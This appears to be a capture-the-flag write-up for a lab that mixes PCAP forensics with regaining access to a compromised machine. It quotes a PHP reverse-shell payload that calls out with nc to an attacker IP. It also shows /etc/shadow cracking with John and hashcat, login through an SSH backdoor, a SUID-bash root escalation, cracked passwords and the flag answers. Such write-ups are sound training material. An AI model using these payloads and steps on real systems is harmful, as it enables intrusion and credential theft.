@@ -1,0 +1,134 @@
+Forensics -Analyse the PCAP
+
+I first used a free online PCAP analyzer called A-Packets. With this tool I was able to find the URL within one of the POST requests.
+
+what was the url of the page they used to upload a reverse shell?
+answer: /development/
+
+Within the same POST request I was able to find more information and eventually found the payload the attacker used to gain access into our machine.
+
+what payload did the attacker use to gain access?
+
+answer: <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+
+
+At this point I have used up all my resources within my PCAP analyzer and had to do some manual digging. I decided to continue the rest of our recon using Wireshark. Within Wireshark I was searching for the string ‘password’ within all of the packet bytes. I was finally able to find something within packet #98.
+
+Our attacker wants to keep their foothold within our system so they would most likely install some sort of software. After digging within the same packet I was able to find something very interesting… a backdoor!
+
+
+ github: git clone https://github.com/NinjaJc01/ssh-backdoor
+
+
+Our attacker downloaded a backdoor from Github, which can be used to SSH into the machine (we will show how this can be used later :)
+
+In packet #98, I find somthinf in option follow tcp.stream eq3
+
+what password did the attacker use to privesc?
+answer: whenevernoteartinstant
+
+how did the attacker establish persistence?
+answer: https://github.com/NinjaJc01/ssh-backdoor
+
+I copyed whole /etc/shadow file and I utilize Jhon The Ripper to crack all user password.
+
+using the fasttrack wordlist, how many of the system passwords were crackable?
+answer: 4
+
+ └──╼ #john --wordlist=/usr/share/wordlists/fasttrack.txt password.txt 
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+secret12         (bee)     
+abcd123          (szymex)     
+1qaz2wsx         (muirland)     
+secuirty3        (paradox)     
+4g 0:00:00:00 DONE (2025-03-08 08:44) 40.00g/s 2220p/s 11100c/s 11100C/s Spring2017..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+Research - Analyse the code
+
+It's time to anaylse.
+
+I inspect whole code and I get the default hash which was included in variable values!
+
+what's the default hash for the backdoor?
+answer: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
+
+What's the hardcoded salt for the backdoor?
+
+In order to find the hardcoded salt we are going to have to analyze the source code. We are able to do this on the GitHub website. The piece that we are specifically looking for is going to be in the main.go portion of code
+
+
+answer: 1c362db832f3f864c8c2fe05f2002a05
+
+what was the hash that the attacker used? -go back to the PCAP for this!
+
+Now we have to go back to the PCAP. Using Wireshark (within that same packet from earlier) I was able to find the hash the attacker used.
+
+james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+answer: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+crack the hash using rockyou and a cracking tool of your choice.What's the password?
+
+For this next step we are going to want to create another text file containing the hash and hardcoded salt in the following format — Hash:Salt. After this we will use the tool hashcat along with our wordlist ‘rockyou’ in order to crack this hash.
+
+hashes.txt: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
+
+command: hashcat --force -m 1710 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+After running the command I was able to crack the hash!
+
+answer: novembar16
+
+Attack -Get back in!
+
+Deploy the machine....
+Navigate the website//
+
+The attacker defaced the website. what message did they leave as a heading? 
+answer: H4ck3d by CooctusClan
+
+
+nmap result: 
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
+|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
+|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: LOL Hacked
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+Time to hack my way back in!
+
+I get 2222 port is open which is ssh. I already know there is a backdoor on the machine and i know the cracked password. Now, First step is to SSH into the machine using port 2222( Previous attacker selected this port within the PCAP).After a successful login I went up one directory (back to /home/james) and was able to find the user flag.
+
+what is the user flag? 
+answer: thm{d119b4fa8c497ddb0525f7ad200e6567}
+
+
+
+This was the hardest part but we get to learn more on escalating privileges. I first tried going into root but was unsuccessful (awe c’mon). With that being said I decided to do more digging. I went back to the original directory I was in and listed all directories (including hidden ones).
+
+I was able to find a suid bash file. I checked the permissions on that file and guess who owns it (yes it’s owned by root). After running this command (./.suid_bash -p) I was able to run the shell as root. I was then able to go to the root directory, where I found the root flag!
+
+
+what is the root flag?
+answer: thm{d53b2684f169360bb9606c333873144d}
+
+Thank you:)!
